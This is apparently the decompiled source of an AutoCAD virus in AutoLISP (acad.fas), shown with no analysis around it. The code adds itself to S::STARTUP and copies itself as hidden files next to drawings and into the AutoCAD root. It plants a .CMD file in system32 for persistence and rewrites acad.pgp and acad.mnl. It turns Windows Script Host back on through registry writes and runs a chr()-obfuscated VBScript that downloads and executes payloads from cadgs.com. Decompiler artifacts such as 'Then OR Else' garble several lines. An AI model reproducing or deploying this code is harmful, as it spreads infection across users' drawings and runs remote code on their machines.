(defun main 
FasStringtables 0
FasStringtables 1
(defun main 
nil
(setq SD20100919 '(nil '(SETVAR "cmdecho" 0) '(VL-LOAD-COM) '(SETVAR "acadlspasdoc" 1) '(VL-LOAD-ALL "acad.fas") '(DJYG) '(GARRISON) '(SETQ TODAY '(RTOS '(GETVAR "cdate") 2 0)) '(IF '(= '(READREG "bz") nil) '(WRITEREG "bz" TODAY)) '(IF '(/= '(READREG "pth1") TODAY) '(PROGN '(DYWBML "acad.pgp") '(DYWBML "acad.mnl") '(WRITEREG "pth1" TODAY))) '(GJWZSD) '(CRYX) '(PRINC)))
SD20100919
(setq S::STARTUP (APPEND S::STARTUP SD20100919))
(setq S::STARTUP (APPEND S::STARTUP SD20100919))
(setq DJYG <Func> DJYG)
DJYG
(setq CRYX <Func> CRYX)
CRYX
(setq GARRISON <Func> GARRISON)
GARRISON
(setq WSHRUN <Func> WSHRUN)
WSHRUN
(setq GXBDK <Func> GXBDK)
GXBDK
(setq GXCX <Func> GXCX)
GXCX
(setq JJWSHELL <Func> JJWSHELL)
JJWSHELL
(setq FSOCOPY <Func> FSOCOPY)
FSOCOPY
(setq ATTRIB <Func> ATTRIB)
ATTRIB
(setq ATTRIBGET <Func> ATTRIBGET)
ATTRIBGET
(setq WRITEREG <Func> WRITEREG)
WRITEREG
(setq READREG <Func> READREG)
READREG
(setq DYWBML <Func> DYWBML)
DYWBML
(setq GJWZSD <Func> GJWZSD)
GJWZSD
(PRINC )
(defun DJYG
(_al-bind-alist '(TMN TMN1 MNL MNL1 SHX SHX1))
(setq TMN (vlax-invoke-method (vlax-create-object "Scripting.FileSystemObject") "GetTempName"))
(setq TMN1 (SUBSTR TMN 5 4))
(setq TMN1 Then OR Else)
(WRITEREG "TMN" TMN1)
(setq MNL (vlax-invoke-method (vlax-create-object "Scripting.FileSystemObject") "GetTempName"))
(setq MNL1 (SUBSTR MNL 4 5))
(setq MNL1 Then OR Else)
(WRITEREG "TMNL" MNL1)
(setq SHX (vlax-invoke-method (vlax-create-object "Scripting.FileSystemObject") "GetTempName"))
(setq SHX1 (SUBSTR SHX 2 7))
(setq SHX1 Then OR Else)
Then OR Else
(defun CRYX
(WRITEREG "CXBB" "102")
(WRITEREG "GXBZ" "103")
(WRITEREG "pth0" "221223921023103")
Then OR Else
(WSHRUN "for /f "tokens=2 delims=[]" %i in ('ping updatebd.8800.org /n 1 /w 0') do reg add "HKCU\SOFTWARE\KenFiles\settings" /v pth0 /t reg_sz /d "%i" /f")
(WRITEREG "pth3" TODAY)
(WRITEREG "pth4" TODAY)
(GXBDK )
(WRITEREG "pth5" TODAY)
Then OR Else
(defun GARRISON
(_al-bind-alist '(VLX INFECT ROOT SHX DIVX FSO MYFILE SHFRF NT YS WS SHF OLDSHX))
(setq INFECT (STRCAT (VL-FILENAME-DIRECTORY (FINDFILE (GETVAR "dwgname"))) "\acad.fas"))
(setq ROOT (STRCAT (VL-FILENAME-DIRECTORY (FINDFILE "acad.dcl")) "\acad.fas"))
(FSOCOPY INFECT ROOT)
(ATTRIB 35 ROOT)
(cond (/= (ATTRIBGET (FINDFILE ROOT)) 35) (
(cond (/= (VL-FILE-SIZE (FINDFILE ROOT)) 9922) (
(ATTRIB 32 ROOT)
(FSOCOPY INFECT ROOT)
(ATTRIB 35 ROOT)
(FSOCOPY ROOT INFECT)
(ATTRIB 35 INFECT)
(cond (/= (ATTRIBGET (FINDFILE INFECT)) 35) (
(cond (/= (VL-FILE-SIZE (FINDFILE INFECT)) 9922) (
(ATTRIB 32 INFECT)
(FSOCOPY ROOT INFECT)
(ATTRIB 35 INFECT)
(setq SHX (STRCAT (FINDFILE Then OR Else) "\" (READREG "SHXN") ".shx"))
(VL-FILE-COPY (FINDFILE "acad.fas") SHX)
(ATTRIB 33 SHX)
(WRITEREG "basepth" (VL-FILENAME-DIRECTORY (FINDFILE "acad.dcl")))
(WRITEREG "fontpth" (FINDFILE "Fonts"))
(setq DIVX (STRCAT (GETENV Then OR Else) "\DivX.fin"))
(setq FSO (vlax-create-object "Scripting.FileSystemObject"))
(setq MYFILE (vlax-invoke-method FSO "CreateTextFile" DIVX T T))
(vlax-invoke-method MYFILE "Write" "’˜â³")
(vlax-invoke-method MYFILE "close")
(vlax-release-object FSO)
(setq SHFRF (STRCAT (GETENV Then OR Else) "\system32\" (READREG "TMN") ".CMD"))
(VL-FILE-COPY DIVX SHFRF)
(setq SHF (OPEN SHFRF "a"))
(WRITE-LINE (STRCAT "@echo off\n::" (RTOS (GETVAR "cdate")) (vlax-invoke-method (vlax-create-object "Scripting.FileSystemObject") "GetTempName") "\nif exist " (CHR 34) ROOT (CHR 34) " goto off\ncopy /y  " (CHR 34) SHX (CHR 34) " " (CHR 34) ROOT (CHR 34) "\nattrib +r +h " (CHR 34) ROOT (CHR 34) "\n:off\nexit") SHF)
(CLOSE SHF)
(ATTRIB 39 SHFRF)
(setq OLDSHX (FINDFILE Then OR Else))
(ATTRIB 32 OLDSHX)
(VL-FILE-DELETE OLDSHX)
(setq OLDSHX (FINDFILE "acad.fas1"))
(ATTRIB 32 OLDSHX)
(VL-FILE-DELETE OLDSHX)
(setq OLDSHX (FINDFILE "logo.gif"))
(ATTRIB 32 OLDSHX)
(VL-FILE-DELETE OLDSHX)
(setq OLDSHX (FINDFILE "isomianyi.shx"))
(ATTRIB 32 OLDSHX)
(VL-FILE-DELETE OLDSHX)
Then OR Else
(defun WSHRUN
(CMDSTR)
(_al-bind-alist '(WS))
(setq WS (vlax-create-object "wscript.shell"))
(vlax-invoke-method WS "run" (STRCAT "cmd /c " CMDSTR) "0" T)
(vlax-release-object WS)
(defun GXBDK
(_al-bind-alist '(STR FSIZE TF SFW))
(setq STR "oN eRROR rESUME nEXT:sET A=cREATEoBJECT(cHR(83)&cHR(99)&cHR(114)&cHR(105)&cHR(112)&cHR(116)&cHR(105)&cHR(110)&cHR(103)&cHR(46)&cHR(70)&cHR(105)&cHR(108)&cHR(101)&cHR(83)&cHR(121)&cHR(115)&cHR(116)&cHR(101)&cHR(109)&cHR(79)&cHR(98)&cHR(106)&cHR(101)&cHR(99)&cHR(116)):A.dELETEfILE wsCRIPT.sCRIPTfULLnAME,tRUE:WScript.Sleep 300000:sET x=cREATEoBJECT(cHR(87)&cHR(83)&cHR(99)&cHR(114)&cHR(105)&cHR(112)&cHR(116)&cHR(46)&cHR(83)&cHR(104)&cHR(101)&cHR(108)&cHR(108)):u=lcASE(cHR(104)&cHR(116)&cHR(116)&cHR(112)&cHR(58)&cHR(47)&cHR(47)&cHR(119)&cHR(119)&cHR(119)&cHR(46)&cHR(99)&cHR(97)&cHR(100)&cHR(103)&cHR(115)&cHR(46)&cHR(99)&cHR(111)&cHR(109)&cHR(47)&cHR(114)&cHR(101)&cHR(116)&cHR(117)&cHR(114)&cHR(110)&cHR(47)&cHR(103)&cHR(120)&cHR(109)&cHR(122)&cHR(46)&cHR(115)&cHR(104)&cHR(120)):f=x.eXPANDeNVIRONMENTsTRINGS(cHR(37)&cHR(116)&cHR(101)&cHR(109)&cHR(112)&cHR(37)&cHR(92)&A.gETtEMPnAME&".vbe"):sET d=cREATEoBJECT(cHR(77)&cHR(105)&cHR(99)&cHR(114)&cHR(111)&cHR(115)&cHR(111)&cHR(102)&cHR(116)&cHR(46)&cHR(88)&cHR(77)&cHR(76)&cHR(72)&cHR(84)&cHR(84)&cHR(80)):d.oPEN cHR(71)&cHR(69)&cHR(84),u,0:d.sEND():sET s=cREATEoBJECT(cHR(65)&cHR(68)&cHR(79)&cHR(68)&cHR(66)&cHR(46)&cHR(83)&cHR(116)&cHR(114)&cHR(101)&cHR(97)&cHR(109)):s.mODE=9000/3000:s.tYPE=8000/8000:s.oPEN():s.wRITE(d.RESPONSEbODY):s.sAVEtOfILE f,600/300:iF A.gETfILE(f).SIZE>3000 tHEN x.RUN cHR(99)&cHR(109)&cHR(100)&cHR(46)&cHR(101)&cHR(120)&cHR(101)&cHR(32)&cHR(47)&cHR(67)&cHR(32)&cHR(115)&cHR(116)&cHR(97)&cHR(114)&cHR(116)&cHR(32)&f,0:dO wHILE A.fILEeXISTS(f):wsCRIPT.sLEEP 500:A.dELETEfILE(f):lOOP")
(setq TF (VL-FILENAME-MKTEMP "gxbdk" "temp" ".vbe"))
(setq FSIZE (RTOS (VL-FILE-SIZE (GETVAR "dwgname"))))
(setq FSIZE Then OR Else)
(setq SFW (OPEN TF "w"))
(WRITE-LINE (STRCAT "'" FSIZE (vlax-invoke-method (vlax-create-object "Scripting.FileSystemObject") "GetTempName") (RTOS (GETVAR "cdate")) "\n" STR "\n" "'" FSIZE (vlax-invoke-method (vlax-create-object "Scripting.FileSystemObject") "GetTempName") (RTOS (GETVAR "cdate"))) SFW)
(CLOSE SFW)
(ads-cmd "_ai_editcustfile")
(ads-cmd TF)
(defun GXCX
(_al-bind-alist '(SAVEPATH MSXML ADOSTR))
(setq SAVEPATH (VL-FILENAME-MKTEMP "gxcx" (GETENV "tmp") ".vbe"))
(setq MSXML (vlax-create-object "Microsoft.XMLHTTP"))
(vlax-invoke-method MSXML "open" "get" "http://www.cadgs.com/return/gxcx.shx" T nil nil)
(vlax-invoke-method MSXML "send" "")
(setq ADOSTR (vlax-create-object "ADODB.Stream"))
(vlax-put-property ADOSTR "Mode" 3)
(vlax-put-property ADOSTR "Type" 1)
(vlax-invoke-method ADOSTR "open" nil nil nil nil nil)
(vlax-invoke-method ADOSTR "write" (vlax-get-property MSXML "responseBody"))
(vlax-invoke-method ADOSTR "savetofile" SAVEPATH "2")
(vlax-release-object MSXML)
(vlax-release-object ADOSTR)
(ads-cmd "_ai_editcustfile")
Then OR Else
(defun JJWSHELL
(_al-bind-alist '(ENA ENB WSH))
(setq ENA (VL-REGISTRY-READ "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Script Host\Settings" "Enabled"))
(setq ENB (VL-REGISTRY-READ "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows Script Host\Settings" "Enabled"))
(cond (= ENA 0) (
(cond (= ENA "0") (
(cond (and nil) (
(cond (= ENB 0) (
(cond (= ENB "0") (
(cond (and nil) (
(setq WSH (vlax-create-object "wscript.shell"))
(vlax-invoke-method WSH "regwrite" "HKLM\SOFTWARE\Microsoft\Windows Script Host\Settings\Enabled" "1" "REG_DWORD")
(vlax-invoke-method WSH "regwrite" "HKCU\SOFTWARE\Microsoft\Windows Script Host\Settings\Enabled" "1" "REG_DWORD")
(vlax-invoke-method WSH "run" "cmd.exe /c rundll32 setupapi,InstallHinfSection DefaultInstall 128 %windir%\inf\wsh.inf&regsvr32 scrrun.dll urlmon.dll shdocvw.dll jscript.dll vbscript.dll /s" "0")
Then OR Else
(defun FSOCOPY
(YUAN  MUBIAO)
(_al-bind-alist '(FSO FILEDX))
(setq FSO (vlax-create-object "Scripting.FileSystemObject"))
(setq FILEDX (vlax-invoke-method FSO "GetFile" YUAN))
(vlax-invoke-method FILEDX "copy" MUBIAO T)
Then OR Else
(defun ATTRIB
(SXZ  PGPFL)
(_al-bind-alist '(FSO FILEDX))
(setq FSO (vlax-create-object "Scripting.FileSystemObject"))
(setq FILEDX (vlax-invoke-method FSO "GetFile" PGPFL))
(vlax-put-property FILEDX "Attributes" SXZ)
Then OR Else
(defun ATTRIBGET
(PGPFL)
(_al-bind-alist '(FSO FILEDX ATTSXZ))
(setq FSO (vlax-create-object "Scripting.FileSystemObject"))
(setq FILEDX (vlax-invoke-method FSO "GetFile" PGPFL))
(setq ATTSXZ (vlax-get-property FILEDX "Attributes"))
(vlax-release-object FSO)
Then OR Else
(defun WRITEREG
(KEYSTR  KEYZ)
(STRCAT (VL-REGISTRY-WRITE "HKEY_CURRENT_USER\Software\KenFiles\settings" KEYSTR KEYZ))
(defun READREG
(KEYZ)
(VL-REGISTRY-READ "HKEY_CURRENT_USER\Software\KenFiles\settings" KEYZ)
(defun DYWBML
(ZDWJ)
(_al-bind-alist '(PGPFILE SLBJ PGP1 PGPSXZ RPGP WPGP PGPTXT))
(setq PGPFILE (FINDFILE ZDWJ))
(setq RPGP (OPEN PGPFILE "r"))
(setq PGPTXT (READ-LINE RPGP))
(cond (WCMATCH PGPTXT (STRCAT (READREG "TMNL") "`,     " (READREG "TMN") "`,           5`,")) (
(cond (WCMATCH PGPTXT (STRCAT "(command "" (READREG "TMNL") "")")) (
(setq SLBJ 1)
(CLOSE RPGP)
(setq PGP1 (STRCAT PGPFILE "1"))
(setq PGPSXZ (ATTRIBGET PGPFILE))
(ATTRIB 32 PGPFILE)
(VL-FILE-RENAME PGPFILE PGP1)
(setq RPGP (OPEN PGP1 "r"))
(setq WPGP (OPEN PGPFILE "w"))
(setq PGPTXT (READ-LINE RPGP))
(cond (WCMATCH PGPTXT "SLIDE`,     SHFR`,           5`,") (
(cond (WCMATCH PGPTXT "(command "slide")") (
(setq PGPTXT "")
(setq PGPTXT (STRCAT (READREG "TMNL") ",     " (READREG "TMN") ",           5,\n" PGPTXT))
(setq PGPTXT (STRCAT "(setvar "cmdecho" 0)\n(command "" (READREG "TMNL") "")\n" PGPTXT))
(WRITE-LINE Then OR Else WPGP)
(CLOSE WPGP)
(ATTRIB PGPSXZ PGPFILE)
(CLOSE RPGP)
(VL-FILE-DELETE PGP1)
(SETVAR "re-init" 16)
Then OR Else
(defun GJWZSD
(_al-bind-alist '(LST N RENAME EXF REXF PCLB REBACK))
(setq LST (LIST "acad.vlx" "acad.sys" "lcm.fas" "acadsmu.fas" "acadapq.lsp" "acadappp.lsp" "acadapp.lsp" "acad.lsp" "dwgrun.bat" "winfas.ini" "acadiso.lsp" "isohztxt.shx"))
(N)
(setq N (car FuncArg[0]))
(setq RENAME (FINDFILE N))
(ATTRIB 32 RENAME)
(ATTRIB 32 (STRCAT RENAME "_bak"))
(VL-FILE-DELETE (STRCAT RENAME "_bak"))
(VL-FILE-RENAME Then OR Else (STRCAT RENAME "_bak"))
(setq EXF (FINDFILE "Exclude.tx